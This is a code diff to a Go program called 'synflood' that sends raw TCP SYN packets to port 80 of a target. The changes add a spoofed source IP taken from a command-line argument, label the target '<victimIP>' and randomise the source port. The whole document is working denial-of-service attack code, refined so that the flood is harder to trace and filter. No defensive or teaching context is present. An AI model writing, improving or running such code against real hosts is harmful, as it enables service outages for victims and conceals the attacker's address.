@@ -22,8 +22,8 @@ func main() {
 	}
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	check(err)
-	if len(os.Args) < 2 {
-		log.Fatal("usage: synflood <ip>")
+	if len(os.Args) < 3 {
+		log.Fatal("usage: synflood <victimIP> <spoofedIP>")
 	}
 	raddr := net.ParseIP(os.Args[1])
 	addr := syscall.SockaddrInet4{
@@ -48,17 +48,17 @@ func main() {
 
 func packet(raddr net.IP) []byte {
 	ip := &layers.IPv4{
-		Version:       0x4,
-		TOS:           0x4,
-		TTL:           0x40,
-		Protocol:      layers.IPProtocolTCP,
-		SrcIP:         net.ParseIP("0.0.0.1"),
-		DstIP:         raddr,
+		Version:           0x4,
+		TOS:               0x0,
+		TTL:               0x40,
+		Protocol:          layers.IPProtocolTCP,
+		SrcIP:             net.ParseIP(os.Args[2]),
+		DstIP:             raddr,
 		WithRawINETSocket: true,
 	}
 	rand.Seed(time.Now().UnixNano())
 	tcp := &layers.TCP{
-		SrcPort:    0xaa47,
+		SrcPort:    layers.TCPPort(rand.Uint32()),
 		DstPort:    0x50,
 		Seq:        rand.Uint32(),
 		DataOffset: 0x5,
